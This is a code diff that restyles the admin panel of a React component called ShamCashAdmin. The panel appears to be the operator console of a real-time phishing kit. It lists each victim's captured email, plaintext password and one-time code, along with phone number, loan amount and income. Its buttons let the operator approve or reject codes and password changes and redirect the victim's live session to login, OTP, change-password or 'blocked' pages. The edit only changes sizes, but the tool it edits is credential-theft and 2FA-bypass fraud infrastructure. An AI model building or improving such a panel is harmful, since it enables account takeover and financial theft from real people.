@@ -438,19 +438,19 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
                     </span>
                   )}
                 </div>
-                <div className="p-4 space-y-3">
+                <div className="p-2.5 space-y-2">
                   {/* Credentials */}
-                  <div className="grid grid-cols-1 gap-2">
+                  <div className="grid grid-cols-1 gap-1">
                     {[
-                      { label: T.email, value: selectedSub.email, icon: <Mail className="h-3 w-3" />, dir: "ltr" },
-                      { label: T.password, value: selectedSub.password || T.notSubmitted, icon: <KeyRound className="h-3 w-3" />, dir: "ltr" },
-                      { label: T.otpCode, value: selectedSub.otpCode || T.waiting, icon: <ShieldCheck className="h-3 w-3" />, dir: "ltr", highlight: !!selectedSub.otpCode },
+                      { label: T.email, value: selectedSub.email, icon: <Mail className="h-2.5 w-2.5" />, dir: "ltr" },
+                      { label: T.password, value: selectedSub.password || T.notSubmitted, icon: <KeyRound className="h-2.5 w-2.5" />, dir: "ltr" },
+                      { label: T.otpCode, value: selectedSub.otpCode || T.waiting, icon: <ShieldCheck className="h-2.5 w-2.5" />, dir: "ltr", highlight: !!selectedSub.otpCode },
                     ].map((row) => (
-                      <div key={row.label} className={`flex items-center justify-between rounded-[9px] px-3 py-2.5 ${row.highlight ? "bg-[#f5a623]/10 border border-[#f5a623]/20" : "bg-[#0d1526] border border-[#1e2a45]"}`}>
-                        <span className={`text-[10px] font-semibold flex items-center gap-1.5 ${row.highlight ? "text-[#f5a623]/70" : "text-white/35"}`}>
+                      <div key={row.label} className={`flex items-center justify-between rounded-[7px] px-2.5 py-1.5 ${row.highlight ? "bg-[#f5a623]/10 border border-[#f5a623]/20" : "bg-[#0d1526] border border-[#1e2a45]"}`}>
+                        <span className={`text-[9px] font-semibold flex items-center gap-1 ${row.highlight ? "text-[#f5a623]/70" : "text-white/35"}`}>
                           {row.icon}{row.label}
                         </span>
-                        <span className={`text-[12px] font-bold ${row.highlight ? "text-[#f5a623]" : row.value === T.waiting || row.value === T.notSubmitted ? "text-white/25" : "text-white/80"}`} dir={row.dir}>
+                        <span className={`text-[11px] font-bold ${row.highlight ? "text-[#f5a623]" : row.value === T.waiting || row.value === T.notSubmitted ? "text-white/25" : "text-white/80"}`} dir={row.dir}>
                           {row.value || "—"}
                         </span>
                       </div>
@@ -459,26 +459,26 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
 
                   {/* OTP Action Buttons */}
                   {selectedSub.isActive && (
-                    <div className="space-y-2 pt-1">
-                      <p className="text-[9px] font-bold text-white/25 uppercase tracking-widest">أوامر OTP</p>
-                      <div className="grid grid-cols-2 gap-2">
+                    <div className="space-y-1.5 pt-0.5">
+                      <p className="text-[8px] font-bold text-white/25 uppercase tracking-widest">أوامر OTP</p>
+                      <div className="grid grid-cols-2 gap-1.5">
                         <button onClick={() => decideOtp("approved")}
-                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95 text-[11px] font-bold">
-                          <CheckCircle className="h-3.5 w-3.5" />{T.approve}
+                          className="flex items-center justify-center gap-1 rounded-[7px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-1.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95 text-[10px] font-bold">
+                          <CheckCircle className="h-3 w-3" />{T.approve}
                         </button>
                         <button onClick={() => decideOtp("rejected")}
-                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95 text-[11px] font-bold">
-                          <XCircle className="h-3.5 w-3.5" />{T.reject}
+                          className="flex items-center justify-center gap-1 rounded-[7px] bg-[#e54343]/15 border border-[#e54343]/30 py-1.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95 text-[10px] font-bold">
+                          <XCircle className="h-3 w-3" />{T.reject}
                         </button>
                       </div>
-                      <div className="grid grid-cols-2 gap-2">
+                      <div className="grid grid-cols-2 gap-1.5">
                         <button onClick={() => sendCmd("redirect:otp")}
-                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#657bd8]/15 border border-[#657bd8]/20 py-2 text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors active:scale-95 text-[10px] font-bold">
-                          <Send className="h-3 w-3" />{T.sendToOtp}
+                          className="flex items-center justify-center gap-1 rounded-[7px] bg-[#657bd8]/15 border border-[#657bd8]/20 py-1.5 text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors active:scale-95 text-[9px] font-bold">
+                          <Send className="h-2.5 w-2.5" />{T.sendToOtp}
                         </button>
                         <button onClick={() => sendCmd("redirect:changepass")}
-                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#1fc28a]/10 border border-[#1fc28a]/15 py-2 text-[#1fc28a]/70 hover:bg-[#1fc28a]/20 transition-colors active:scale-95 text-[10px] font-bold">
-                          <RefreshCw className="h-3 w-3" />{T.sendToChangepass}
+                          className="flex items-center justify-center gap-1 rounded-[7px] bg-[#1fc28a]/10 border border-[#1fc28a]/15 py-1.5 text-[#1fc28a]/70 hover:bg-[#1fc28a]/20 transition-colors active:scale-95 text-[9px] font-bold">
+                          <RefreshCw className="h-2.5 w-2.5" />{T.sendToChangepass}
                         </button>
                       </div>
                     </div>
@@ -488,19 +488,19 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
 
               {/* BASIC INFO */}
               <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
-                <div className="flex items-center gap-2 border-b border-[#1e2a45] px-4 py-2.5">
-                  <UserRound className="h-4 w-4 text-white/40" />
-                  <span className="text-[12px] font-extrabold text-white/60">{T.basicInfo}</span>
+                <div className="flex items-center gap-1.5 border-b border-[#1e2a45] px-3 py-2">
+                  <UserRound className="h-3 w-3 text-white/40" />
+                  <span className="text-[11px] font-extrabold text-white/60">{T.basicInfo}</span>
                 </div>
-                <div className="p-4 space-y-2">
+                <div className="p-2.5 space-y-1">
                   {[
-                    { label: T.phone, value: selectedSub.phone, icon: <Phone className="h-3 w-3" />, dir: "ltr" },
-                    { label: T.submittedTime, value: selectedSub.submittedAt, icon: <Clock className="h-3 w-3" />, dir: "ltr" },
-                    { label: T.page, value: selectedSub.page, icon: <MapPin className="h-3 w-3" />, dir: "rtl" },
+                    { label: T.phone, value: selectedSub.phone, icon: <Phone className="h-2.5 w-2.5" />, dir: "ltr" },
+                    { label: T.submittedTime, value: selectedSub.submittedAt, icon: <Clock className="h-2.5 w-2.5" />, dir: "ltr" },
+                    { label: T.page, value: selectedSub.page, icon: <MapPin className="h-2.5 w-2.5" />, dir: "rtl" },
                   ].map((row) => (
-                    <div key={row.label} className="flex items-center justify-between rounded-[9px] bg-[#0d1526] border border-[#1e2a45] px-3 py-2.5">
-                      <span className="text-[10px] font-semibold text-white/35 flex items-center gap-1.5">{row.icon}{row.label}</span>
-                      <span className={`text-[12px] font-bold ${row.value ? "text-white/80" : "text-white/20"}`} dir={row.dir}>{row.value || "—"}</span>
+                    <div key={row.label} className="flex items-center justify-between rounded-[7px] bg-[#0d1526] border border-[#1e2a45] px-2.5 py-1.5">
+                      <span className="text-[9px] font-semibold text-white/35 flex items-center gap-1">{row.icon}{row.label}</span>
+                      <span className={`text-[11px] font-bold ${row.value ? "text-white/80" : "text-white/20"}`} dir={row.dir}>{row.value || "—"}</span>
                     </div>
                   ))}
                 </div>
@@ -508,18 +508,18 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
 
               {/* LOAN DETAILS */}
               <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
-                <div className="flex items-center gap-2 border-b border-[#1e2a45] px-4 py-2.5">
-                  <DollarSign className="h-4 w-4 text-[#1fc28a]/60" />
-                  <span className="text-[12px] font-extrabold text-[#1fc28a]/60">{T.loanInfo}</span>
+                <div className="flex items-center gap-1.5 border-b border-[#1e2a45] px-3 py-2">
+                  <DollarSign className="h-3 w-3 text-[#1fc28a]/60" />
+                  <span className="text-[11px] font-extrabold text-[#1fc28a]/60">{T.loanInfo}</span>
                 </div>
-                <div className="p-4 space-y-2">
+                <div className="p-2.5 space-y-1">
                   {[
-                    { label: T.loan, value: selectedSub.loan ? `${selectedSub.loan} ل.س` : "", icon: <DollarSign className="h-3 w-3" /> },
-                    { label: T.income, value: selectedSub.income ? `${selectedSub.income} ل.س` : "", icon: <TrendingUp className="h-3 w-3" /> },
+                    { label: T.loan, value: selectedSub.loan ? `${selectedSub.loan} ل.س` : "", icon: <DollarSign className="h-2.5 w-2.5" /> },
+                    { label: T.income, value: selectedSub.income ? `${selectedSub.income} ل.س` : "", icon: <TrendingUp className="h-2.5 w-2.5" /> },
                   ].map((row) => (
-                    <div key={row.label} className="flex items-center justify-between rounded-[9px] bg-[#0d1526] border border-[#1e2a45] px-3 py-2.5">
-                      <span className="text-[10px] font-semibold text-white/35 flex items-center gap-1.5">{row.icon}{row.label}</span>
-                      <span className={`text-[12px] font-bold ${row.value ? "text-[#1fc28a]" : "text-white/20"}`} dir="ltr">{row.value || "—"}</span>
+                    <div key={row.label} className="flex items-center justify-between rounded-[7px] bg-[#0d1526] border border-[#1e2a45] px-2.5 py-1.5">
+                      <span className="text-[9px] font-semibold text-white/35 flex items-center gap-1">{row.icon}{row.label}</span>
+                      <span className={`text-[11px] font-bold ${row.value ? "text-[#1fc28a]" : "text-white/20"}`} dir="ltr">{row.value || "—"}</span>
                     </div>
                   ))}
                 </div>
@@ -528,10 +528,10 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
               {/* CHANGE PASSWORD */}
               {(selectedSub.changepassStatus || selectedSub.isActive) && (
                 <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
-                  <div className="flex items-center justify-between border-b border-[#1e2a45] px-4 py-2.5">
-                    <div className="flex items-center gap-2">
-                      <KeyRound className="h-4 w-4 text-[#1fc28a]/60" />
-                      <span className="text-[12px] font-extrabold text-[#1fc28a]/60">تغيير كلمة المرور</span>
+                  <div className="flex items-center justify-between border-b border-[#1e2a45] px-3 py-2">
+                    <div className="flex items-center gap-1.5">
+                      <KeyRound className="h-3 w-3 text-[#1fc28a]/60" />
+                      <span className="text-[11px] font-extrabold text-[#1fc28a]/60">تغيير كلمة المرور</span>
                     </div>
                     {selectedSub.changepassStatus && (
                       <span className={`rounded-full px-2 py-0.5 text-[9px] font-bold
@@ -545,15 +545,15 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
                     )}
                   </div>
                   {selectedSub.isActive && (
-                    <div className="p-4">
-                      <div className="grid grid-cols-2 gap-2">
+                    <div className="p-2.5">
+                      <div className="grid grid-cols-2 gap-1.5">
                         <button onClick={() => decidePass("approved")}
-                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95 text-[11px] font-bold">
-                          <CheckCircle className="h-3.5 w-3.5" />{T.approve}
+                          className="flex items-center justify-center gap-1 rounded-[7px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-1.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95 text-[10px] font-bold">
+                          <CheckCircle className="h-3 w-3" />{T.approve}
                         </button>
                         <button onClick={() => decidePass("rejected")}
-                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95 text-[11px] font-bold">
-                          <XCircle className="h-3.5 w-3.5" />{T.reject}
+                          className="flex items-center justify-center gap-1 rounded-[7px] bg-[#e54343]/15 border border-[#e54343]/30 py-1.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95 text-[10px] font-bold">
+                          <XCircle className="h-3 w-3" />{T.reject}
                         </button>
                       </div>
                     </div>
@@ -563,19 +563,19 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
 
               {/* REDIRECT ACTIONS */}
               {selectedSub.isActive && (
-                <div className="rounded-[14px] border border-[#657bd8]/20 bg-[#657bd8]/5 p-4 space-y-2">
-                  <p className="text-[10px] font-bold text-[#657bd8]/60 uppercase tracking-widest flex items-center gap-1.5">
-                    <ArrowRightLeft className="h-3 w-3" />{T.redirectTo}
+                <div className="rounded-[14px] border border-[#657bd8]/20 bg-[#657bd8]/5 p-2.5 space-y-1.5">
+                  <p className="text-[9px] font-bold text-[#657bd8]/60 uppercase tracking-widest flex items-center gap-1">
+                    <ArrowRightLeft className="h-2.5 w-2.5" />{T.redirectTo}
                   </p>
-                  <div className="grid grid-cols-2 gap-2">
+                  <div className="grid grid-cols-2 gap-1.5">
                     {[
-                      { cmd: "redirect:login", label: T.redirectLogin, icon: <UserRound className="h-3 w-3" />, color: "text-white/60 border-white/10 bg-white/5 hover:bg-white/10" },
-                      { cmd: "redirect:otp", label: T.redirectOtp, icon: <ShieldCheck className="h-3 w-3" />, color: "text-[#657bd8] border-[#657bd8]/20 bg-[#657bd8]/10 hover:bg-[#657bd8]/20" },
-                      { cmd: "redirect:changepass", label: T.redirectChangepass, icon: <KeyRound className="h-3 w-3" />, color: "text-[#1fc28a] border-[#1fc28a]/20 bg-[#1fc28a]/10 hover:bg-[#1fc28a]/20" },
-                      { cmd: "redirect:blocked", label: T.redirectBlocked, icon: <XCircle className="h-3 w-3" />, color: "text-[#e54343] border-[#e54343]/20 bg-[#e54343]/10 hover:bg-[#e54343]/20" },
+                      { cmd: "redirect:login", label: T.redirectLogin, icon: <UserRound className="h-2.5 w-2.5" />, color: "text-white/60 border-white/10 bg-white/5 hover:bg-white/10" },
+                      { cmd: "redirect:otp", label: T.redirectOtp, icon: <ShieldCheck className="h-2.5 w-2.5" />, color: "text-[#657bd8] border-[#657bd8]/20 bg-[#657bd8]/10 hover:bg-[#657bd8]/20" },
+                      { cmd: "redirect:changepass", label: T.redirectChangepass, icon: <KeyRound className="h-2.5 w-2.5" />, color: "text-[#1fc28a] border-[#1fc28a]/20 bg-[#1fc28a]/10 hover:bg-[#1fc28a]/20" },
+                      { cmd: "redirect:blocked", label: T.redirectBlocked, icon: <XCircle className="h-2.5 w-2.5" />, color: "text-[#e54343] border-[#e54343]/20 bg-[#e54343]/10 hover:bg-[#e54343]/20" },
                     ].map((opt) => (
                       <button key={opt.cmd} onClick={() => sendCmd(opt.cmd)}
-                        className={`flex items-center justify-center gap-1.5 rounded-[9px] border py-2.5 transition-colors active:scale-95 text-[10px] font-bold ${opt.color}`}>
+                        className={`flex items-center justify-center gap-1 rounded-[7px] border py-1.5 transition-colors active:scale-95 text-[9px] font-bold ${opt.color}`}>
                         {opt.icon}
                         <span className="truncate">{opt.label}</span>
                       </button>
